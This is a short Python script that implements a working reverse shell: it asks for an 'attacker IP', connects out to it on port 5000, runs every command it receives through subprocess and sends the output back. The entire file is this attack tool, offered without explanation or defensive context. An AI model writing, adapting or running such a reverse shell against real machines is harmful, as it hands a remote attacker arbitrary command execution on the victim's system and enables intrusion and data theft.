import socket
import subprocess

HOST = input("Enter attacker IP: ")
PORT = 5000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((HOST, PORT))

print("Connected to server")

while True:
    command = sock.recv(1024).decode()
    if command == "exit":
        break

    output = subprocess.getoutput(command)

    sock.send(output.encode())

sock.close()
